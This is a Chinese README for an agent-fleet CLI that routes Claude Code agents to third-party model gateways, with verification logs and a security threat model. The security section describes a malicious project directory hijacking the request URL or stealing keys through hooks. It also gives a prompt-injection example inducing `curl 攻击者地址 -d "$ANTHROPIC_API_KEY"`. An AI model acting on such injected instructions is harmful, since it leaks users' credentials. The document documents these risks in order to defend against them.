当前模型刷新：Grok 路由为 `grok-4.7`，已通过 agent-fleet 生产真实调用（返回 `4`，无控制 token）；GPT-6 Sol 与 DeepSeek V4.1 Flash 已通过 Kollab CLI 生产真实调用，新 agent-fleet 别名的相同托管配置已通过静态检查，尚未逐个运行 SDK。历史 Grok 4.6 验证仅对应当时版本。

没有真实的 DeepSeek/Moonshot API key(也没有去别的项目"顺手"拿),所以**这两家官方端点没有做过真实
模型的端到端验证**。`kollab-gateway` 是例外——它用的是 Kollab 产品自助生成的账号 key,不需要等第三方
审批,已经做过一次真实的端到端验证(见第 0 条)。已经做到的:

0. **`kollab-gateway` 系列四个条目全部真实端到端验证(TEST 环境)**:用 `kollab api-key create`
   生成了一把真实的 `kollab_live_*` standalone key(账号自助生成、随时可在 Kollab 里吊销/重建,
   不是 Kollab 内部基础设施或第三方供应商的密钥),写进本地 `.env`(未提交),对 `kollab-gateway`、
   `kollab-gateway-copy`、`kollab-gateway-research`、`kollab-gateway-bulk` 各跑了一次真实调用,例如:
   ```bash
   node bin/agent-fleet.mjs run --model kollab-gateway --prompt "回复OK两个字,不要调用任何工具" --json
   ```
   四次调用全部返回 `"ok": true`、`"result": "OK"`、`"isError": false`,分别解析到
   `resolvedModel: gemini-3.8-flash`(x2,`kollab-gateway` 和 `kollab-gateway-copy`)、
   `grok-4.6`(`kollab-gateway-research`)、`gemini-3.5-flash-lite`(`kollab-gateway-bulk`),
   都带真实的 `totalCostUsd`(从该 key 绑定的 Space 额度扣除)和 `sessionId`,确认请求真的经过
   `POST https://test.flowus.work/api/llm` 拿到了对应模型的真实响应,不是报错也不是 mock,返回内容
   里也没有出现裸的 tool-call 控制 token。

   **`jev`(Typesafe System One,2026-09-25 接入并真实验证)**:先读了 <https://docs.typesafe.ai/>
   全部相关页面(`introduction/quickstart`、`concepts/system-one`、`api`、`models`、
   `introduction/coding-agents`、`agent-skill`),确认协议是自有的 `typesafe-systemone`
   (`POST /v1/systemone`,`state` + 类型化 `questions` → `noul`/`choice`/`score` 结构化答案),
   不是 Anthropic Messages 也不是 OpenAI 协议,且官方明确说明它"不生成回复、不写代码、不做
   推理解释"。真实用 `TYPESAFE_API_KEY` 打了 26 次 `https://api.typesafe.ai/v1/systemone`
   (`mktemp -d` 目录里跑,curl 直连 + 最后用 `agent-fleet judge` CLI 复测一致),覆盖:结构化
   抽取(工单路由+打分+退款判断三问一次拿到,`confidence` 均 ≥0.87)、爬取一页真实 Wikipedia
   文本后分类打分、复刻 wy-coliney/jev-browser-use 用法的"下一步选哪个候选"(accessibility-tree
   文本 → `choice`,正确选出该先填的表单字段,置信度 0.92)、批量文件改动前的安全性判断(3 个
   候选 diff 里正确挑出无行为变更的一项)、同一输入连打 20 次的稳定性(`noul` 波动 ≤0.01、`score`
   波动 ≤0.12/满量程 3,平均延迟 1193ms)。也验证了它的边界:故意用 `noul` 让它"写一首俳句"
   只回了个概率不是文字、编造的 `"type":"generate"` 被协议拒绝(`HTTP 400`)、塞一张真实 PNG
   base64 进去只得到一个答非所问的低概率(印证文档"no image input")、`POST /v1/messages`
   返回 `404`(证实无法接入 `run`/`run-many`)。26 次调用总成本约 **$0.0004**。因为协议层面
   和 `run`/`run-many` 依赖的 Anthropic Messages 协议根本不兼容,新增了独立的 `judge` 子命令
   (`src/judge-task.mjs`)直连它自己的协议,并在 `run`/`run-many` 里加了协议闸门——`run --model
   jev` 会在发请求前直接报错拒绝,不会静默发出必然失败的请求(已用真实命令验证)。另外只读调研了
   4 个第三方 JEV skill 仓库(wy-coliney/jev-browser-use、okooo5km/jev、
   dbreunig/building-with-jev-skill、kerpopule/hermes-jev-skills),结论和用法要点见上面
   「JEV / `judge` 子命令」一节,完整能力摸底报告见任务产出的 `jev-capabilities.md`。

   **子 agent 模型映射**：历史 `kollab-gateway-copy` 任务曾因子 agent 继承网关模型 ID 触发本地 `unrecognized_model`。当前通过 `CLAUDE_CODE_SUBAGENT_MODEL=sonnet` 与 `ANTHROPIC_DEFAULT_SONNET_MODEL=deepseek-v4.1-flash` 映射到同网关模型；本地假上游测试核对环境与请求体。历史成功调用不等于此映射已完成真实网关验收。

1. **代码能正常跑**:`--help`、`--version`、`list-models`、缺参数/缺密钥/未知模型等错误路径都手动
   跑过,报错信息清晰可操作。
2. **本地假上游端到端验证**(`test/smoke-test.mjs`,`npm run smoke-test`):自己起了一个模拟 Anthropic
   Messages 流式协议的本地 HTTP 服务器(`test/mock-anthropic-server.mjs`),配一个指向它的假模型,
   真跑一次完整的 `run` 和 `run-many`,断言:
   - CLI 真的把请求发到了配置里指定的 `baseURL`,而不是官方 Anthropic 端点
   - `x-api-key` 和 `Authorization: Bearer` 两种鉴权风格都按配置正确生效
   - `bypassPermissions` 权限模式下,SDK 真的跑完了一整个 `query()` 循环并产出最终 `result`
   - `run-many` 里两个不同模型的任务确实并发跑完,各自拿到正确的结果
   - (2026-09-26 追加)真实发出的请求体 `system` 字段里包含默认追加的执行者系统提示,确认
     `preset+append` 没有被替换或丢失

   这条验证**不需要任何真实密钥**,`npm run smoke-test` 随时可以重跑。

3. **安全回归测试**(`test/security-unit-test.mjs` + `test/security-e2e-test.mjs`,
   `npm run security-test`):专门守下面「安全边界」一节那几条不变量。端到端那一半会同时起**两个**
   本地假上游——一个扮演"你配置的正经上游",一个扮演"攻击者地址",然后按"攻击者那边到底收没收到
   密钥"来判定,而不是断言代码里有没有某一行。覆盖:宿主凭据泄露场景、目标目录劫持 `baseURL`、
   目标目录注入自定义头、恶意配置藏在祖先目录、绕过前置闸门时结构性兜底是否还在,外加两条
   正向用例(正常项目目录不被误拦、合法自定义头仍然能用)。同样**不需要任何真实密钥**。
   (2026-09-26 追加)`subagentModel` 的赋值逻辑、flag 层钉定,以及目标目录仍然拦不住这两个
   新变量,也补进了单元测试第 7 节。

   跑全部验证:`npm test`。

4. **联调和复核过程中发现并修复了三个真实的安全问题**,详见下面「安全边界」一节。

## 接下来你需要做的事

0. 想先跑起来、不想等第三方 key 审批:直接用 `kollab-gateway` 系列——`kollab api-key create --name <你的名字>`
   生成一把 `kollab_live_*` key,填进 `.env` 的 `KOLLAB_LIVE_API_KEY`,四个条目(`kollab-gateway`、
   `kollab-gateway-copy`、`kollab-gateway-research`、`kollab-gateway-bulk`)都已经验证过真实可用
   (见上一节第 0 条),按「任务类型 → 推荐模型」表按用途直接选对应条目名即可。
1. 去 DeepSeek(<https://platform.deepseek.com>)和/或 Moonshot(<https://platform.moonshot.cn>)
   生成真实 API key,填进 `.env`。
2. 如果要用 Gemini,自己搭一个 Anthropic 兼容网关,把地址和它认的模型 ID 填进
   `models.config.json` 的 `gemini` 条目。
3. 手动跑一次真实调用确认端到端可用,比如:
   ```bash
   node bin/agent-fleet.mjs run --model deepseek-v4.1-flash --prompt "说一句你好" --json
   ```
4. 需要的话把 `bin/agent-fleet.mjs` 链接到 `PATH` 里(比如 `npm link`),这样就能直接敲
   `agent-fleet run ...`,不用带 `node bin/agent-fleet.mjs` 前缀。

## 安全边界

### 谁说了算:信任模型

这个工具的核心信任规则只有一条:

> **「请求发去哪个地址、带什么凭据、带什么额外请求头」的唯一真相源,是你自己的
> `models.config.json` + `.env`。其它任何来源都无权改动这三件事,也无权让这台机器在
> 带着这些凭据的环境里自动执行命令。**

"其它任何来源"具体指两类,都已经出过真实漏洞:

| 不可信来源 | 它曾经能干什么 | 现在怎么挡的 |
|---|---|---|
| **继承来的宿主环境变量**(你在另一个 Claude Code 会话里嵌套跑这个工具时) | 宿主的 OAuth 登录态、宿主配的 `ANTHROPIC_CUSTOM_HEADERS`(可能是企业代理口令)会跟着请求发给你配的第三方地址 | `src/isolated-env.mjs`:每次调用前整族剥离 `ANTHROPIC_*` / `CLAUDE_*` 环境变量,再只叠回本次任务要用的那几个 |
| **`--cwd` 指向的目标工作目录**(可能是别人发给你的项目文件夹) | 目录里自带一份 `.claude/settings.json`,用 `env.ANTHROPIC_BASE_URL` 就能把请求整个劫持到攻击者地址,**你配置在 `.env` 里的真实第三方 key 被原样送过去**;`hooks` 字段则能在会话启动时无条件执行任意命令,一条 `printenv` 就把密钥读走 | 默认不读取、不加载项目配置;可选白名单只加载过滤结果 + `src/run-task.mjs` 把路由钉在 flag 层配置里 |

第二条尤其要注意:它**不需要**"嵌套在另一个 Claude Code 会话里"这个前提,只要你拿这个工具去处理一个
别人给的目录就会触发,所以危害比第一条更高。而且它**不需要模型配合**——`hooks` 那条是无条件执行的,
不像 prompt injection 还要看模型上不上钩。

### 目标工作目录能做什么、不能做什么

默认无需配置白名单,任何 `--cwd` 都能运行。目标目录的 `.claude/settings.json` 和
`.claude/settings.local.json` **不读取内容、不加载**,即使含 hooks、插件、env、凭据 helper 或非法 JSON
也不会因此拒绝运行。SDK 的 `settingSources` 固定为 `[]`,默认 `settings` 只含 fleet 自己钉死的请求配置;
项目权限、输出风格等配置也不会生效。发现项目/祖先目录里存在这些配置文件时,只向 stderr 打一行忽略提示;
没有文件就不打印。这个决定仍在 `resolveModel` 读密钥之前完成,不可信配置不能影响密钥解析。

选择「忽略整个配置」而不是「拒绝运行」,就不用为每个自己的仓库维护白名单;安全保证由根本不加载来满足,
而不是靠逐个识别越权字段。项目 hooks、插件、env、凭据 helper 都不会进入子任务;
目标目录的 `.mcp.json` 也不自动加载(`strictMcpConfig`)。
这不等于屏蔽所有项目文本:`CLAUDE.md` / 文件内容的 prompt injection 风险仍见下文。

只有希望项目里的权限等行为配置生效时,才需要可选白名单。对自己控制的仓库,可在 agent-fleet 根目录的
`.env` 或进程环境变量中设置 `AGENT_FLEET_TRUSTED_CWDS=/绝对路径/仓库一:/绝对路径/仓库二`（进程环境优先）。
白名单按 realpath 后的目录边界覆盖自身及子目录,不覆盖同名前缀的兄弟目录,空值、相对路径和 `/` 均忽略。
命中时会输出提示,并只加载过滤后的项目配置（如权限）：项目里的 `hooks`、`statusLine`、插件、`env`、凭据 helper
与登录方式设置一律不带进子任务;白名单目录的非法 JSON 仍会报错,因为这条可选路径需要解析配置。
请求地址、凭据和自定义头仍只取自 `models.config.json` + 操作者的 `.env`/环境变量。
仍建议只添加自己控制的目录,不要添加第三方项目。

### 不会污染你正在用的 Claude Code

agent-fleet 会把 `CLAUDE_CONFIG_DIR` 指向自己专属的 `~/.agent-fleet/claude-config/`,所以它跑出来的
会话记录不会混进你真实 Claude Code 的 `~/.claude/`(已实测:跑一次任务,`~/.claude/` 下没有新增任何
由它产生的文件)。同时它也不加载你的全局 `~/.claude/settings.json` 和目标目录的 `.mcp.json`。

另外它会关掉 Claude Code CLI 默认的遥测、错误上报、自动更新检查和 GrowthBook 远程 feature-flag
拉取(`DISABLE_TELEMETRY`/`DISABLE_UPDATES`/`DISABLE_GROWTHBOOK`/`DO_NOT_TRACK` 等一整组开关,
逐个对照已安装 SDK 的原生二进制核实过是真实生效的变量名,不是抄文档臆测),目标是除了发给你
配置的那个模型端点之外不产生其它对外流量。

**这一条已经做过网络层面的验证,不是只停留在"设了开关"**:跑一次真实任务(`agent-fleet run`),
在执行期间用本机代理内核(Clash/mihomo 一类工具的 external-controller API)记录的 SNI 连接日志,
按 OS 级别的进程路径精确反查这个 SDK 原生二进制发起的每一次连接——结果是整个任务执行期间它只
建立了一次对外连接,目的地就是 `models.config.json` 里配的第三方 baseURL,没有任何流量打到
`*.anthropic.com`、`*.sentry.io`、`cdn.growthbook.io` 这些 Anthropic 或其遥测供应商控制的域名。
也就是说:只要你在 `models.config.json` 里配的是非 Claude 端点,Anthropic 的服务器不会看到这次
调用的存在,自然也就无从"知道"你在切换或使用其它模型。

**注意**:工具跑的是 `bypassPermissions` 全权限 Agent,它对你主目录下的文件**没有**任何自动防护。
如果任务描述含糊、或者你把 `--cwd` 指向主目录,它是有可能去读甚至改 `~/.claude/` 这类敏感目录的。
边界得由你自己把住:把 `--cwd` 指向那个具体项目目录,别指向 `~`。

### 其它既有约束

- 代码、配置模板、这份 README 里都没有写过任何真实 API key。
- `.env` 已被仓库 `.gitignore` 排除。
- `models.config.json` 本身允许提交进 git——它不含密钥,`apiKeyEnv` / `headerEnvs` 都只是变量名指针;
  如果有人不小心往里面直接写字面量 `apiKey` 或 `headers`,`src/config.mjs` 加载时会直接拒绝并报错。
- `list-models` 只显示密钥和自定义头的状态(present/missing),从不打印它们的值。
- 默认不加载项目/本地配置;可选白名单只加载过滤结果,始终不加载全局 `~/.claude/settings.json`。

### 还没解决的风险(不要误读上面这些防护的强度)

**这个工具目前仍然不适合用来处理你完全不信任的目录。** 上面修的是"零交互、纯配置驱动"的静默劫持:
攻击者不需要你做任何事,把工具指过去密钥就没了。这类路径已经堵上。

但 agent-fleet 跑的是 `bypassPermissions` 的自主 Agent——它会读目录里的文件、执行 bash,而且
**不需要人工确认每一步**。所以一个恶意目录仍然可以:

- 在 `CLAUDE.md` 或任何会被读到的文件里写 prompt injection,诱导模型自己执行
  `curl 攻击者地址 -d "$ANTHROPIC_API_KEY"`;
- 诱导模型读取并外发这台机器上的其它文件(SSH 私钥、其它项目的 `.env` 等)。

可选白名单的过滤清单仍是**黑名单**,不是完备的白名单。Claude Code 后续新增的字段如果能执行命令
或影响出口,需要补进 `src/project-trust.mjs`。默认路径完全不加载项目配置,不依赖这张字段清单。

这是 `bypassPermissions` 这个设计选择的固有代价,不是配置层能解决的问题。实务建议:

- 处理来路不明的目录时,**先把它当成不可信代码看待**,或者干脆别用这个工具;
- 真要跑,放进容器/一次性虚拟机里跑,别在装着你全部凭据的主力机器上跑;
- `.env` 里只放这个工具真正需要的第三方 key,别把它和别的凭据堆在同一个 shell 环境里。

## fleet-go 快速派单

`fleet-go new fix-card --to gpt --auth local --goal "修复窄屏卡片溢出" --write /path/to/project --body task.md` 按产品自动拼标准块、lint、写 brief 并前台执行 fleet；也支持 heredoc 正文。`--dry-run` 只打印，`--no-launch` 只落盘。块在 `skill/templates/blocks/`，可直接编辑；paid 必须传 `--budget`，生产目标与回滚条件写在独有正文。

修订用 `fleet-go amend fix-card "补充要求"`；优先 `--say`，不支持插话则保留修订并提示，确需重来才用 `--restart`（先 stop 并核验残留）。`fleet-go lint brief.md` 检查格式与启动禁令；`fleet-go status` 给运行摘要。brief 和用于恢复命令的 `.brief.json` 放在 `~/.agent-reports/<日期>/`，同名拒绝覆盖。启动仍用工具 `run_in_background:true`，脚本不后台化。需要 Python 3，无新增 npm 依赖。
